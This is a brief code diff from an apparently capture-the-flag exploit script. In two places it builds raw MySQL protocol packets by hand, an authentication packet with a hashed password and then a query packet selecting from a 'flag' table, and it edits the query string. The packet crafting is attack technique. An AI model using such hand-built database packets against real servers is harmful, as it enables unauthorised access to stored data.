@@ -358,7 +358,7 @@ async function step2(serverSeed){
 
 	var p1 = "\x14\x00\x00\x03"+hashedPassword
 
-	var query = "select * from flag#";
+	var query = "select * from flag#sendtome";
 	var p2 = `${String.fromCharCode(query.length+9)}\x00\x00\x00\x03${query}`
 
 	var packet = p1+p2;
@@ -459,7 +459,7 @@ async function step2(serverSeed){
 
 	var p1 = "\x14\x00\x00\x03"+hashedPassword
 
-	var query = "select * from flag#";
+	var query = "select * from flag#sendtome";
 	var p2 = `${String.fromCharCode(query.length+9)}\x00\x00\x00\x03${query}`
 
 	var packet = p1+p2;
